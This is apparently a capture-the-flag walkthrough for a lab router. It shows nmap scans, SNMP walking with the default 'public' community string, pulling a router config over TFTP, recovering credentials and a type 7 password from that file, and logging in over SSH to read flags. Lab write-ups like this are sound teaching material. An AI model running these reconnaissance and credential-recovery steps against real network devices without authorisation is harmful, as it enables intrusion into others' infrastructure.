# Trivial takeover

## Read before you start!

Read the notes and launch the machine

## Enumeration

### What protocol is running on port TCP/179?

TCP scan using nmap
```
nmap -Pn -n -p- -sS 10.X.X.X

PORT    STATE SERVICE
22/tcp  open  ssh
179/tcp open  bgp

```

### Is this a router? (yay or nay)

Machine is running BGP so I would say "yay"

### What services are running on UDP port 69 and 161 respectively?

UDP scn using nmap
```
nmap -Pn -n -F -sU 10.X.X.X

PORT    STATE         SERVICE
69/udp  open|filtered tftp
161/udp open          snmp
```


## Walk the walk

### What is the default 'read' community string? 

Quick search shows the answer is 'public'

### What is the System Location string?

Try our luck with the default community 'public' and SNMP walk the router 

```
apt install snmp

snmpwalk -v2c -c public 10.X.X.X .
```

## Where are the files?

### Does the supported file transfer protocol support directory listings? (yay or nay)

Quick research around TFTP shows the answer is "nay" and file names need to be enumerated from lists of well known names


## First Flag

Enumerate TFTP using nmap

```
nmap -sU -p69 --script tftp-enum.nse 10.X.X.X

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum:
|_  *********
```

Then copy the config to attack box

```
apt install tftp

tftp 10.X.X.X                   
tftp> get *********
tftp> quit  
```

Read the file
```
cat *********
```

....and find the first flag "THM{**************************}"


## Credentials

### The username is....

See if there are any credentials in the file - there are!


### What type (number) is the router using for it's password encryption?  

The password is also in the file and looks like a type "7" encryption


## Second Flag

Crack the password

Google _"router type 7 password"_

Log in with credentials and find the second flag

```
ssh ******@10.X.X.X

cat flag.txt

THM{***************************}
```

